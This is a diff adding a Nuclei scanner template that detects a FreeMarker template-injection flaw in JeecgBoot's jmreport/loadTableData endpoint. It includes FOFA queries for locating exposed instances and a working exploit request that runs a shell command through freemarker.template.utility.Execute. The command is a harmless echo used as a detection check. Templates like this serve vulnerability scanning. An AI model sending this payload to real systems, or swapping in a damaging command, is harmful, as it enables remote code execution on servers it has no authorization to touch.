@@ -1,0 +1,31 @@
+
+id: JeecgBoot-loadTableData-RCE
+
+info:
+  name: Jeecg Boot jmreport/loadTableData接口存在FreeMarker SSTI注入漏洞 攻击者可以通过操纵应用程序的模板引擎来执行恶意代码或获取敏感信息
+  author: test
+  severity: high
+  metadata: 
+    fofa-query: title=="JeecgBoot 企业级低代码平台" || body="window._CONFIG['imgDomainURL'] = 'http://localhost:8080/jeecg-boot/" || title="Jeecg-Boot 企业级快速开发平台" || title="Jeecg 快速开发平台" || body="'http://fileview.jeecg.com/onlinePreview'" || title=="JeecgBoot 企业级低代码平台" || title=="Jeecg-Boot 企业级快速开发平台" || title=="JeecgBoot 企业级快速开发平台" || title=="JeecgBoot 企业级快速开发平台" || title="Jeecg 快速开发平台" || title="Jeecg-Boot 快速开发平台" || body="积木报表" || body="jmreport"
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+http:
+  - raw:
+      - |
+        POST /jeecg-boot/jmreport/loadTableData HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json;charset=UTF-8
+        Connection: close
+        
+        {"dbSource":"","sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"echo 8888888888\")}'","tableName":"test_demo);","pageNo":1,"pageSize":10}
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"8888888888")
